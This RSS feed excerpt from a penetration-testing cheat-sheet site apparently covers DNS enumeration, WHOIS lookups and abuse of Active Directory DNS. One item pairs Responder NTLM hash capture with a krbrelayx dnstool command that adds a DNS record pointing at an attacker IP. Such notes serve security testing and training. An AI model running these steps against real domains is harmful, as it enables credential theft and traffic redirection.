channel.title: Dns on TLDRBins
channel.description: Recent content in Dns on TLDRBins

item.title: DNS Enum
item.description: Zone Transfer dig +noall +answer example.com axfr @10.10.11.10 Domain Discovery dig +noall +answer @10.10.11.10 example.com dig +noall +answer @10.10.11.10 -x 10.10.11.10 dig +noall +answer @10.10.11.10 +short example.com any dig +noall +answer @10.10.11.10 -t NS example.com

item.title: Krbrelayx
item.description: Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u <DOMAIN>\\<USER> -p <PASSWORD> --action add --record test --data 10.10.14.10 --type A 10.10.11.10 Ref: krbrelayx tools

item.title: whois
item.description: WHOIS # General whois example.com # With specific server whois -h <WHOIS_SERVER> -p 43 example.com
